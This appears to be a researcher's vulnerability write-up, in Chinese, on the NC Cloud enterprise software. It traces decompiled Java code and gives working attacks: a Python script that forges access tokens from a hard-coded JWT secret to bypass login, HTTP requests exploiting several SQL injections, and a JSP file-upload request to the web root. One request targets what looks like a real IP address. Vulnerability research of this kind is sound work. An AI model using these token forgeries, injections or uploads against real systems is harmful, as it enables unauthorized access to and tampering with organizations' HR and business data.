## nccloud



### 鉴权部分

ncchr路由的loginfilter如下

```
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException {
        response.setHeader("Access-Control-Allow-Origin", WebSocketServerHandshaker.SUB_PROTOCOL_WILDCARD);
        response.setHeader("Access-Control-Allow-Methods", WebSocketServerHandshaker.SUB_PROTOCOL_WILDCARD);
        String nccAppCode = request.getHeader(NCC_APPCODE);
        if (StringUtils.isNotBlank(nccAppCode)) {
            AppContext.getContext().setAppCode(nccAppCode);
        }
        try {
            if (validToken(request) || validAccessToken(request) || validSession(request) || isExcludedPage(request)) {
                filterChain.doFilter(request, response);
            } else {
                loginError(request, response);
            }
            LoginHelper.destorySecurityToken();
            InvocationInfoProxy.getInstance().reset();
        } catch (Throwable th) {
            LoginHelper.destorySecurityToken();
            InvocationInfoProxy.getInstance().reset();
            throw th;
        }
    }
```

validAccessToken中代码如下

```
    private boolean validAccessToken(HttpServletRequest request) {
        String token = request.getHeader(ACCESSTKEN_NCC);
        log.error(">>>>accesstokenncc:{}", token);
        if (StringUtils.isEmpty(token)) {
            return false;
        }
        InvocationInfoProxy proxy = InvocationInfoProxy.getInstance();
        proxy.setUserId(JwtTokenUtil.getInstance().getPrivateClaimFromToken(token, "userid"));
        proxy.setGroupId(JwtTokenUtil.getInstance().getPrivateClaimFromToken(token, "pk_group"));
        proxy.setUserDataSource(JwtTokenUtil.getInstance().getPrivateClaimFromToken(token, "datasource"));
        proxy.setDeviceId(JwtTokenUtil.getInstance().getPrivateClaimFromToken(token, NccLoginConst.DeviceId));
        proxy.setUserCode(JwtTokenUtil.getInstance().getPrivateClaimFromToken(token, NccLoginConst.Usercode));
        proxy.setLangCode(JwtTokenUtil.getInstance().getPrivateClaimFromToken(token, NccLoginConst.Langcode));
        log.error(">>>accesstokenncc userId:{}", proxy.getUserId());
        log.error(">>>accesstokenncc userCode:{}", proxy.getUserCode());
        log.error(">>>accesstokenncc groupId:{}", proxy.getGroupId());
        log.error(">>>accesstokenncc datasource:{}", proxy.getUserDataSource());
        log.error(">>>accesstokenncc langcode:{}", proxy.getLangCode());
        LoginHelper.ensureSecurity();
        return true;
    }
```

```
    private static final String ACCESSTKEN_NCC = "accessTokenNcc";
```

获取accessTokenNcc字段值通过JwtTokenUtil解密

由于默认密钥硬编码导致绕过

```
    public String getPrivateClaimFromToken(String token, String key) {
        Object obj = getClaimFromToken(token).get(key);
        if (obj != null) {
            return obj.toString();
        }
        return null;
    }
    
        public Claims getClaimFromToken(String token) {
        return (Claims) Jwts.parser().setSigningKey(this.jwtProperties.getSecret()).parseClaimsJws(token).getBody();
    }
    
    public class JwtProperties {
    public static final String JWT_PREFIX = "jwt";
    private String header = "Authorization";
    private String secret = "defaultSecret";
```

网上的脚本如下

```
 1 import json
 2 import base64
 3 import hashlib
 4 import hmac
 5 
 6 strbase64 = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 7 dictbase64 = {k:i for i,k in enumerate(strbase64)}
 8 dictbase64[b"="[0]] = 0
 9 stt = b"defaultSecret"
10 strarr = (stt[i-4:i] for i in range(4,len(stt)+1,4))
11 arrby = bytearray()
12 num = 0
13 for nuits in strarr:
14     rint = 0
15     for k in nuits:
16         if k == b"="[0]: num +=1 #统计尾部等号个数
17         rint = (rint << 6) + dictbase64[k]
18     arrby.extend(rint.to_bytes(3,"big"))
19 while num: #去除尾部0字符
20     arrby.pop()
21     num -= 1
22 secret_key = bytes(arrby)
23 headers = {
24           "alg": "HS256",
25           "typ": "JWT"
26         }
27 payload = {"userid": "1"}
28 first = base64.urlsafe_b64encode(json.dumps(headers, separators=(',', ':')).encode('utf-8').replace(b'=', b'')).decode('utf-8').replace('=', '')
29 second = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode('utf-8').replace(b'=', b'')).decode('utf-8').replace('=', '')
30 first_second = f"{first}.{second}"
31 third = base64.urlsafe_b64encode(hmac.new(secret_key, first_second.encode('utf-8'), hashlib.sha256).digest()).decode('utf-8').replace('=', '')
32 token = ".".join([first, second, third])
33 print(token)
```



### ibapioservice sql注入

打开源码之后发现有很多getter方法如getMetaDef、getBapTableDatas，按照nccloud的sql查询方法起名一般是get开头，于是在这里面看一下哪些数据传入后有被get开头方法处理的，最后发现了这个

```
    private MetaTableDef getMetaDef(String tableId) throws SmartMetaException {
        String[] splits = tableId.split("@");
        if (ArrayUtils.isEmpty(splits) || splits.length < 2) {
        }
        MetaTableDef tableDef = SmartMetaUtilities.getSmartMetaService().getMetaTableByTableName(splits[1], splits[0]);
    }

```

可以看到我们对tableId传入数据会以@分割然后赋予到splits数组中，然后交给getMetaTableByTableName处理

跟进可看到

```
    public MetaTableDef getMetaTableByTableName(String dsName, String tableName) throws SmartMetaException {
        if (StringUtils.isEmpty(tableName)) {
        }
        String clause2 = " upper(tableid)='" + tableName.toUpperCase() + "' ";
        if (StringUtils.isEmpty(dsName)) {
            clause = clause2 + "and isnull(dsname,'~')='~' ";
        } else {
            clause = clause2 + "and upper(dsname)='" + dsName.toUpperCase() + "'";
        }
        Object[] datas = new DAOAction().loadByClause(MetaTable.class, SmartConfigCache.getDsName4Design(), clause);
```

但是不能直接使用这个，需要找一个调用了这个的方法

```
    public BapTableEntity[] getBapTable(String... tableIds) throws Exception {
        try {
            if (ArrayUtils.isEmpty(tableIds)) {
            }
            List<BapTableEntity> tableList = new ArrayList<>();
            for (String tableId : tableIds) {
                try {
                    MetaTableDef tableDef = getMetaDef(tableId);
```

直接使用getBapTable即可注入

poc大致如下 没写参数部分

```
POST /uapws/service/nc.itf.bap.service.IBapIOService HTTP/1.1
Host: 
Accesstokenncc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
SOAPAction: urn:getBapTable

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ibap="http://service.bap.itf.nc/IBapIOService">
<soapenv:Header/>
<soapenv:Body>
<ibap:getBapTable>
</ibap:getBapTable>
</soapenv:Body>
</soapenv:Envelope>
```



### queryApplyTypes sql注入

```
    @RequestMapping({"/queryApplyTypes"})
    public Object queryApplyTypes(String staffId) {
        result.setData(this.typeService.queryTypesStaffCanApply(staffId));
    }
    
    public List<BusinessTripType> queryTypesStaffCanApply(String staffId) {
            try {
            if (StringUtils.isEmpty(staffId)) {
                CommonSimpleStaff staff = this.simpleStaffCommonHepler.getStaffByUserId(userId);
            }
            CommonStaffJob staffJob = this.simpleStaffCommonHepler.loadLastJobByStaffId(staffId);
            
              public CommonStaffJob loadLastJobByStaffId(String staffId) throws AdderBusinessException {
        String condition = "pk_psndoc='" + staffId + "' and ismainjob='Y' and dr=0 and lastflag='Y' and pk_psnorg in (select pk_psnorg from hi_psnorg where pk_psndoc='" + staffId + "' and lastflag='Y' and indocflag = 'Y')";

```



### queryStaffByName sql注入

```
GET /ncchr/pm/staff/queryStaffByName?name=1 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Accesstokenncc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
Host: 218.4.37.234:9999
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```





```
        public static Map<String, PmStaff> queryStaffByName(String name, int pageindex, int pagesize) {
        Pageable pageObj = new PagerRequest(pageindex, pagesize, null);
        Page<CommonSimpleStaff> simpleStaffPage = simpleService.querySimpleStaffPageByName(name, pageObj);
        
    public Page<CommonSimpleStaff> querySimpleStaffPageByName(String name, Pageable pageable) throws AdderBusinessException {
        String condition = SIMPLESTAFF_ONDUTY_CON;
        if (StringUtils.isNotBlank(name)) {
            condition = condition + " and bd_psndoc.name like '%" + name.trim() + "%'";
```



### runScript存在SQL注入漏洞

if语句决定key值不能为空，script.startsWith(SCRIPT_QUERY_METHOD script值不能以select开头否则进入else，最后直接将sql语句带入查询了

```
@RequestMapping({"/attendScript"})
@RestController
    private static final String SCRIPT_QUERY_METHOD = "select";
    @RequestMapping(value = {"/internal/runScript"}, method = {RequestMethod.POST})
    public Object runScript(HttpServletRequest request, String key, String script) {
        if (!StringUtils.isEmpty(key)) {
            try {
                if (!StringUtils.isEmpty(script)) {
                                    try {
                        if (MD5.verify(AUTH_ATTEND, key, authorization) && !script.startsWith(SCRIPT_QUERY_METHOD)) {
                        } else if (MD5.verify(AUTH_ATTEND, key, authorization)) {
                            List<Map<String, Object>> selectAll = runner2.selectAll(script, new Object[0]);

    public List<Map<String, Object>> selectAll(String sql, Object... args) throws SQLException {
        PreparedStatement ps = this.connection.prepareStatement(sql);
        

```

### importhttpscer文件上传

网上poc如下

```
POST /nccloud/mob/pfxx/manualload/importhttpscer HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
accessToken: eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA
Content-Length: 190
Content-Type: multipart/form-data; boundary=fd28cb44e829ed1c197ec3bc71748df0

--fd28cb44e829ed1c197ec3bc71748df0
Content-Disposition: form-data; name="file"; filename="./webapps/nc_web/141172.jsp"

<%out.println(1111*1111);%>
--fd28cb44e829ed1c197ec3bc71748df0--
```

我的好友Le1a已经写过了所以就不写了

https://www.le1a.me/2

